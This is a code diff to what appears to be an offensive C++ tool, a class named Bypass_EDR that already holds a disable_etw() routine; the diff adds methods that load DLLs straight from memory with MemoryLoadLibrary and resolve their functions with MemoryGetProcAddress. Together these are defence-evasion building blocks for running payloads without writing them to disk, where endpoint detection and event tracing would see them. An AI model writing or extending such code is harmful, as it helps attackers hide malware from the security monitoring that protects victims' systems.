@@ -306,3 +306,56 @@ BOOL Bypass_EDR::disable_etw()
 
 	return TRUE;
 }
+
+bool Bypass_EDR::load_dll(const char* dll_name, const char* dll_data, size_t dll_size)
+{
+	std::string module_name = std::string(dll_name);
+
+	if (this->module_map.find(module_name) != this->module_map.end())
+	{
+		// Already exists, just return true without loading the new one
+		return true;
+	}
+
+	HMEMORYMODULE module = MemoryLoadLibrary(dll_data, dll_size);
+
+	if (module == NULL)
+	{
+		return false;
+	}
+
+	this->module_map[module_name] = module;
+
+	return true;
+
+}
+
+bool Bypass_EDR::dll_exists(const char* dll_name)
+{
+	std::string module_name = std::string(dll_name);
+
+	if (this->module_map.find(module_name) != this->module_map.end())
+	{
+		return true;
+	}
+	else
+	{
+		return false;
+	}
+}
+
+void* Bypass_EDR::get_func(const char* dll_name, const char* func_name)
+{
+	std::string module_name = std::string(dll_name);
+
+	auto module = this->module_map.find(module_name);
+
+	if (module == this->module_map.end())
+	{
+		return NULL;
+	}
+
+	void* result = MemoryGetProcAddress(module->second, func_name);
+
+	return result;
+}
